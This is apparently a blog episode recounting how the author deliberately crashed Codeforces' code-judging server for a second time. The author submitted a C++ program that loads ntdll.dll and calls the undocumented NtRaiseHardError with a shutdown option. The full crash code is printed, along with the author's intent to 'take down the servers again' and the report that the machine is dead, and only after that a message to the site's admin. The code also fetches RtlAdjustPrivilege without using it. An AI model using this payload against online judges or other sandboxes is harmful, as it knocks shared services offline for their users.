The Fall

Taking down the server again!

Episode 2:

So far I have managed to uncover that there is some issues with how the submission codes are being executed but we don’t necessarily know what. However, the behavior of the simple process-killing hinted that some permissions aren’t set correctly.

Now since it’s windows another thing to note is that processes aren’t really important. What matters more are the users under which these processes are running. From what I understood about codeforces was that you send the code to a router and then it sends that to a virtual machine on which the checking takes place. We would assume that this virtual machine is logged in as a user with the lowest possible privileges, and we’d be wrong.

Last time we used MS C# .NET. Well, now we’ll get serious. Let’s use C++ and let’s try to use WINAPI too. Scary, isn’t it?

At this point, I didn’t really care much about knowing the exact details of what things were wrong. I wanted to take down the servers again. Just like I mentioned in Episode 1 we know that we killed the processes using C#’s wrapper of the WINAPI so why not use the winapi directly?

I thought about something I read in the past about an undocumented function in the winapi that crashes your OS. This function is NtRaiseHardError which you can read more about online as I will try to keep this related to Codeforces and not why Microsoft sucks.

Let’s remember how this code looked like and boom:

#include <Windows.h>
#include <ntstatus.h>

#define OPTION_SHUTDOWN 6
#define SHUTDOWN_PRIVILEGE 19

typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege) (
		ULONG privilege,
		BOOLEAN enable,
		BOOLEAN current_thread,
		PBOOLEAN enabled);
typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(
		NTSTATUS error_status,
		ULONG number_of_parameters,
		ULONG unicode_string_parameter_mask,
		PULONG_PTR parameters,
		ULONG response_option,
		PULONG reponse);

int main()
{ 
	pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	BOOLEAN enabled;
	pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
	ULONG response;
	NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, OPTION_SHUTDOWN, &response);
    // RIP Machine...
}

The server on which the submissions are processed is now dead. Again. The thing is, I am here confused on why I can call things like LoadLibrary and GetProcAddress and ntdll.dll seriously? However, I am a good guy and I send Mike a message with my latest find.
